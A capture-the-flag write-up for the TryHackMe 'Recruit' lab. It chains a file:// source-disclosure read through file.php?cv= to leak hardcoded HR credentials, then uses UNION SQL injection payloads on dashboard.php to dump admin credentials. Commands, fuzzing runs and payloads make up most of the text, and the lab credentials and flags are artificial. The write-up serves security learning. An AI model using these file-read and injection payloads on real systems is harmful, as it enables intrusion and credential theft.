# Recruit — TryHackMe Writeup

**Target:** `TARGET_IP` (10.129.178.196 at time of solve)
**OS:** Linux (Ubuntu)
**Difficulty:** Medium
**Tech stack:** OpenSSH 8.2p1, ISC BIND 9.16.1, Apache 2.4.41, PHP, MySQL (phpMyAdmin)
**Exploit chain:** `file.php?cv=file://` arbitrary read → fuzz `.php` files in webroot → `config.php` leaks `hr:hrpassword123` → login as HR → `dashboard.php` `LIKE '%$search%'` UNION SQLi → `admin:admin@001admin`

---

## Attack Chain Overview

```
nmap → 22, 53, 80 (Apache 2.4.41)
    ↓
http://$TARGET/api.php → docs leak /file.php?cv=<URL>
    ↓
ffuf parameter name → ?cv only param accepted
ffuf parameter value → file:///var/www/html/.htaccess returns
    ↓
webroot fuzz → index, config, api, dashboard, header, footer, file
    ↓
curl ?cv=file:///var/www/html/config.php
    ↓ leaks
$HR_PASSWORD = 'hrpassword123'
$API_VERSION = 'v1'
    ↓
login as hr → user flag THM{LOGGED_IN_USER}
    ↓
dashboard.php → search field renders rows
    ↓
SELECT * FROM candidates WHERE name LIKE '%$search%'   ← unsanitised
    ↓
%' UNION SELECT 1,2,3,4-- -                            (4 cols confirmed)
%' UNION SELECT 1,username,password,4 FROM users-- -   admin:admin@001admin
    ↓
admin flag THM{LOGGED_IN_ADM1N1}
```

---

## Table of Contents
1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Initial Access — File Read via `?cv=file://`](#3-initial-access--file-read-via-cvfile)
4. [User Flag — Source Disclosure → Hardcoded Creds](#4-user-flag--source-disclosure--hardcoded-creds)
5. [Admin Flag — UNION SQLi on `dashboard.php`](#5-admin-flag--union-sqli-on-dashboardphp)
6. [Key Takeaways](#6-key-takeaways)

---

## 1. Reconnaissance

```bash
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sVC -p22,53,80 $TARGET -oN service
```

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH 8.2p1 |
| 53/tcp | ISC BIND 9.16.1 |
| 80/tcp | Apache 2.4.41 |

See [nmap.md](../../tools/recon/nmap.md).

---

## 2. Web Enumeration

```bash
feroxbuster -u http://$TARGET -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
# /phpmyadmin/
# /api.php       ← docs leak the LFI endpoint
# /file.php
```

`/api.php` self-documents:
```
The Recruit API is used internally to fetch and process candidate CVs from external sources during the recruitment process.
You can fetch a candidate CV using the following endpoint:
/file.php?cv=<URL>
```

See [feroxbuster.md](../../tools/fuzz/feroxbuster.md).

---

## 3. Initial Access — File Read via `?cv=file://`

Full technique: [php-source-disclosure-lfi.md](../../exploits/web-disclosure/php-source-disclosure-lfi.md).

### 3a. Confirm the parameter

```bash
curl http://$TARGET/file.php?cv
# Only local files are allowed
curl http://$TARGET/file.php?user
# Missing cv parameter
```

Cross-check by fuzzing the parameter name:
```bash
ffuf -u "http://$TARGET/file.php?FUZZ" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -fw 3
# only `cv` produces non-baseline
```

### 3b. Find readable paths

```bash
ffuf -u "http://$TARGET/file.php?cv=file:///FUZZ" \
  -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fw 2
# /var/www/html/.htaccess  [Status: 200, Size: 460]
```

The filter only allows reads under the webroot, but **`file://` is honoured** — and it returns raw bytes, so any `.php` file is leaked as **source**.

---

## 4. User Flag — Source Disclosure → Hardcoded Creds

### 4a. Brute `.php` filenames

```bash
ffuf -u "http://$TARGET/file.php?cv=file:///var/www/html/FUZZ.php" \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -fw 2
# index, config, api, dashboard, header, footer, file
```

### 4b. Pull `config.php`

```bash
curl "http://$TARGET/file.php?cv=file:///var/www/html/config.php"
```

```php
// NOTE:
// These credentials are stored here temporarily for ease of access
// during the initial deployment and will be moved to the database
// in a future release.
$HR_PASSWORD = 'hrpassword123';

$API_ENABLED = true;
$API_VERSION = 'v1';
```

### 4c. Login

`hr:hrpassword123` lands the HR portal:

```
THM{LOGGED_IN_USER}
```

---

## 5. Admin Flag — UNION SQLi on `dashboard.php`

Full technique: [sql-union-injection.md](../../exploits/web-disclosure/sql-union-injection.md).

### 5a. Read the source

```bash
curl "http://$TARGET/file.php?cv=file:///var/www/html/dashboard.php"
```

```php
$query = "SELECT * FROM candidates WHERE name LIKE '%$search%'";
```

Classic unsanitised concat inside a `LIKE`.

### 5b. Confirm + count columns

In the dashboard search box:
```
%' UNION SELECT 1,2,3,4-- -
```

Renders below the candidate list:
```
1   2   3   4         ← 4 columns visible
```

### 5c. Dump `users`

```
%' UNION SELECT 1,username,password,4 FROM users-- -
```

```
1   admin   admin@001admin   4
```

### 5d. Login as admin

```
THM{LOGGED_IN_ADM1N1}
```

---

## 6. Key Takeaways

- A "fetch URL" handler that reads with `file_get_contents()` instead of `include()` returns **raw `.php` source**. That is far worse than a normal LFI — `config.php` hands you DB creds and API tokens directly.
- Always probe the parameter name (`?FUZZ`) and value (`?cv=file:///FUZZ`) separately — the filter often defends one but not the other.
- A `LIKE '%$x%'` with unescaped concat is UNION-injectable from the first query. `%' UNION SELECT 1,2,3,4-- -` is the universal column-count probe.
- API version strings (`$API_VERSION = 'v1'`) inside leaked source are a **pivot signal** — see [hidden-parameter-fuzzing.md](../../exploits/web-disclosure/hidden-parameter-fuzzing.md).
- "Encoded" / "temporarily hardcoded" creds in dev comments are real findings: vendors leave them in.

---

## Related Notes
- [php-source-disclosure-lfi.md](../../exploits/web-disclosure/php-source-disclosure-lfi.md) — initial access
- [sql-union-injection.md](../../exploits/web-disclosure/sql-union-injection.md) — admin flag
- [lfi-php-parameter.md](../../exploits/web-disclosure/lfi-php-parameter.md) — sibling LFI primitive
- [hidden-parameter-fuzzing.md](../../exploits/web-disclosure/hidden-parameter-fuzzing.md) — parameter-discovery pattern
- [nmap](../../tools/recon/nmap.md), [ffuf](../../tools/fuzz/ffuf.md), [feroxbuster](../../tools/fuzz/feroxbuster.md), [curl](../../tools/web/curl.md)
